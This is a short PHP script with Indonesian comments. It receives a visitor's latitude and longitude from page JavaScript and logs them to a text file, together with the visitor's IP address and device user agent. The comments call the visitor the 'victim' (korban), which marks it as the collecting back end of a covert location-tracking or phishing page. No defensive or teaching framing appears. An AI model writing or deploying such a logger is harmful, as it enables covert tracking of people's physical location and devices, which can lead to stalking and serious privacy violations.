<?php
// Ambil data dari JavaScript
$lat = $_POST['lat'];
$lon = $_POST['lon'];
$ip = $_SERVER['REMOTE_ADDR']; // Ambil IP korban sekalian
$user_agent = $_SERVER['HTTP_USER_AGENT']; // Tau dia pake HP apa

// Format data yang mau disimpen
$data = "IP: " . $ip . " | Lat: " . $lat . " | Lon: " . $lon . " | Device: " . $user_agent . "\n";

// Simpen ke file hasil.txt (bakal otomatis kebuat)
file_put_contents('hasil.txt', $data, FILE_APPEND);
?>
